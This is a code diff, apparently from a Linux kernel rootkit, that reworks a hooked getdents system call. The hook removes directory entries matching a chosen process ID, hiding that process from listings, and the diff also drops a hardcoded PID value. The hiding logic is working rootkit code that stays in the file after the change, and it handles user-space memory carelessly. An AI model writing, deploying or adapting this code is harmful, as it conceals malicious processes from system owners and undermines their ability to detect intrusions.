@@ -40,41 +40,31 @@ asmlinkage int new_stat(const struct pt_regs *regs) {
 
 //
 asmlinkage int new_getdents(const struct pt_regs *regs) {
+    struct linux_dirent *curr = (struct linux_dirent*)regs->si;
+    int ret=(*old_getdents)(regs);
+    int i = 0;
 
-        int ret;
+    while (i < ret) {
 
-        // the current structure
-        struct linux_dirent *curr = (struct linux_dirent*)regs->si;
+        if (!strcmp(curr->d_name, hide_pid)) {
 
-        int i = 0;
-
-        ret = (*old_getdents)(regs);
-
-	// going threw the entries, looking for our pid
-        while (i < ret) {
-
-		// checking if it is our process
-                if (!strcmp(curr->d_name, hide_pid)) {
-
-                                // length of this linux_dirent
-                                int reclen = curr->d_reclen;
-                                char *next = (char*)curr + reclen;
-                                int len = (int)regs->si + ret - (uintptr_t)next;
-                                memmove(curr, next, len);
-                                ret -= reclen;
-                                continue;
-                }
-
-                i += curr->d_reclen;
-                curr = (struct linux_dirent*)((char*)regs->si + i);
+            int reclen = curr->d_reclen;
+            char *next = (char*)curr + reclen;
+            int len = (int)regs->si + ret - (uintptr_t)next;
+            memmove(curr, next, len);
+            ret -= reclen;
+            continue;
         }
 
-        return ret;
+            i += curr->d_reclen;
+            curr = (struct linux_dirent*)((char*)regs->si + i);
+        }
+
+    return ret;
 }
 
 //declaring path to proccess
 void buffer_path_pid(void){
-    hide_pid="452";
     strncpy(full_path,pre_path,sizeof(full_path));
     strncat(full_path,hide_pid,sizeof(full_path));
 }
